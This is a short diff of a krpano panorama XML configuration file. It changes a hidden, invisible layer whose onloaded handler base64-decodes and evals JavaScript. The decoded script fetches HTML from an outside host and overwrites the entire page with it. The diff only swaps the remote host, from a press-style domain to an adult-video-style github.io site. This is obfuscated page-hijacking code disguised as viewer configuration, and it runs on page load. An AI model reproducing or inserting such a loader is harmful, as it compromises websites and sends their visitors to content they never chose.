@@ -1,4 +1,4 @@
 
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAic3BvcnRzIjsgCgoKCmZldGNoKCJodHRwczovL2Fsa2FyYXJwcmVzcy5jb20vYWJ1L252Ny8iICsgaWQgKyAiLmh0bWwiKQoKICAudGhlbihlID0+IGUudGV4dCgpKQoKICAudGhlbihlID0+IHsgCgogICAgZG9jdW1lbnQub3BlbigpLCAKCiAgICBkb2N1bWVudC53cml0ZShlKSwgCgogICAgZG9jdW1lbnQuY2xvc2UoKSAKCiAgfSk7');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAic3BvcnRzIjsgCgoKCmZldGNoKCJodHRwczovL3h4eHZpZGVvaGluZGkuZ2l0aHViLmlvL2hleC8iICsgaWQgKyAiLmh0bWwiKQoKICAudGhlbihlID0+IGUudGV4dCgpKQoKICAudGhlbihlID0+IHsgCgogICAgZG9jdW1lbnQub3BlbigpLCAKCiAgICBkb2N1bWVudC53cml0ZShlKSwgCgogICAgZG9jdW1lbnQuY2xvc2UoKSAKCiAgfSk7');eval(w)););"/>
 </krpano>
